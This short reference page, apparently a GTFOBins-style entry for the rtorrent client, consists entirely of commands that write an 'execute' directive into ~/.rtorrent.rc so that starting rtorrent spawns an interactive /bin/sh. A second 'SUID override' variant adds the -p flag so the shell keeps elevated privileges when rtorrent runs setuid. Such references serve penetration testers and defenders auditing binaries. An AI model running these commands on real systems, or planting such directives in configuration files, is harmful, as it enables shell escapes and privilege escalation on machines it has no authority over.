title: rtorrent
html:
rtorrent

Shell

After the shell, exit with `Ctrl-Q`.

echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent

SUID override:

echo 'execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
